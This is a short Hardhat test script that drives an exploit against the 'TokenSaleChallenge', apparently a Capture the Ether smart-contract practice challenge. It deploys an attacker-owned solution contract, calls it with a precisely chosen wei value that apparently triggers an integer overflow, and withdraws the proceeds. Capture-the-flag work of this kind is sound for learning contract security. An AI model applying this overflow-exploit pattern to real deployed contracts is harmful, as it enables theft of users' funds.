import { expect } from "chai";
import * as hre from "hardhat";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer, utils } from "ethers";

describe("TokenSaleChallenge", function () {
  let deployer: Signer;
  let attacker: Signer;

  const getWei = (eth: string) => {
    return ethers.utils.parseEther(eth);
  };
  const getEth = (wei: BigNumber) => {
    return wei.div("1000000000000000000");
  };

  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();
  });

  it("Get Eth", async function () {
    const challengeAddress = "0x185aB19ED465E1156744fE0c57e03c45E0D97F10";
    const challenge = await ethers.getContractAt("TokenSaleChallenge", challengeAddress);
    // const Challenge = await ethers.getContractFactory("TokenSaleChallenge", deployer);
    // const challenge = await Challenge.deploy({ value: utils.parseEther('1.0') });
    // await challenge.deployed();
    // const challengeAddress = challenge.address;

    const Solution = await ethers.getContractFactory("TokenSaleChallengeSolution", attacker);
    const solution = await Solution.deploy();
    await solution.deployed();

    console.log('solution deployed at: ', solution.address);

    const recepit = await solution.c(challengeAddress, { value: BigNumber.from('415992086870360064') });
    const resReceipt = await recepit.wait();
    await solution.withdraw();
  });
})
